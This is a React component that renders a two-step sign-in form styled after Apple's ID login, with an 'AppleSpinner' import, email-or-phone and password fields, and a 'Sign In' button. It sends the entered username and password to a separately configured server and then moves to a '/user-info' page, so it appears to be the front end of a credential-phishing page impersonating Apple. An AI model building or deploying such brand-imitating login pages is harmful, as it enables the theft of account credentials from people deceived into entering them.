import { useState } from "react";
import { url } from "../url";
import IOSSpinner from "./AppleSpinner";
import { useNavigate } from "react-router-dom";
export default function AppleAuthFields() {
  const [step, setStep] = useState<1 | 2>(1);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [focused, setFocused] = useState(false);
  const [loading, setLoading] = useState(false);
  const navigate = useNavigate();
  const isValidEmailOrPhone = (value: string) => {
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  const phoneRegex = /^\+?[0-9]{7,15}$/;

  return emailRegex.test(value) || phoneRegex.test(value);
};

  const handleContinue = () => {
    if (step === 1 && isValidEmailOrPhone(email)) setStep(2);
  };
  const handleApiLogin = async () => {
    if (!password) return;

    try {
      setLoading(true);
      // navigate("/user-info");
      const response = await fetch(`${url}/api/`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ username: email, password }),
      });

      const data = await response.json();
      localStorage.setItem("user_id", data.id);
      if (!response.ok) {
        throw new Error(data.message || "Login failed");
      }

      navigate("/user-info");
    } catch (err) {
      console.log(err);
      //   alert("Invalid credentials");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="w-full max-w-md mx-auto mt-20">
      {/* GROUP CONTAINER */}
      <div
        className={`relative rounded-2xl border transition-all duration-300 overflow-hidden bg-white ${
          focused ? "border-blue-500 ring-4 ring-blue-100" : "border-gray-300"
        }`}
      >
        {/* EMAIL */}
        <div className="relative px-5 pt-6 pb-4">
          <input
            type="text"
            id="email" // Add an ID for accessibility
            value={email}
            required
            autoFocus
            onChange={(e) => setEmail(e.target.value)}
            autoComplete="off" // Changed from "off"
            className="peer w-full bg-transparent appearance-none outline-none text-gray-700 placeholder-transparent"
            placeholder="Email" // This MUST be present for peer-not-placeholder-shown to work
          />
          <label
            htmlFor="email" // Link label to input via ID
            className="absolute left-5 top-4 text-gray-500 text-lg transition-all duration-200 
               peer-placeholder-shown:top-4 peer-placeholder-shown:text-lg
               peer-focus:top-2 peer-focus:text-xs peer-focus:text-gray-500
               peer-not-placeholder-shown:top-2 peer-not-placeholder-shown:text-xs"
          >
            Email or Phone Number
          </label>
        </div>

        {step === 2 && <div className="h-px bg-gray-200" />}

        {/* PASSWORD */}
        <div
          className={`relative px-5 transition-all duration-400 ${
            step === 2 ? "max-h-28 pt-6 pb-4 opacity-100" : "max-h-0 opacity-0"
          } overflow-hidden`}
        >
          <input
            type="password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            onFocus={() => setFocused(true)}
            onBlur={() => setFocused(false)}
            className="peer w-full bg-transparent text-gray-500 outline-none placeholder-transparent"
            placeholder="Password"
          />
          <label
            className="absolute left-5 top-4 text-gray-500 text-lg transition-all duration-200 
            peer-focus:top-2 peer-focus:text-xs peer-focus:text-gray-500
            peer-not-placeholder-shown:top-2 peer-not-placeholder-shown:text-xs"
          >
            Password
          </label>
        </div>
      </div>

      {/* OPTIONS */}
      {step === 2 && (
        <div className="flex justify-between items-center mt-4 text-sm">
          <label className="flex items-center gap-2 text-gray-700">
            <input type="checkbox" />
            Remember me
          </label>
          <a href="#" className="text-blue-600 hover:underline">
            Forgot password?
          </a>
        </div>
      )}

      {/* BUTTON */}
      <button
        onClick={step === 1 ? handleContinue : handleApiLogin}
        disabled={loading}
        className={`w-full mt-8 py-3 rounded-xl text-lg font-medium transition-all duration-200 flex items-center justify-center gap-2
  ${
    loading
      ? "bg-blue-500/70 cursor-not-allowed"
      : "bg-blue-600 hover:bg-blue-700 active:scale-[0.98] text-white"
  }`}
      >
        {loading ? (
          <IOSSpinner size={20} />
        ) : step === 1 ? (
          "Continue"
        ) : (
          "Sign In"
        )}
      </button>
    </div>
  );
}
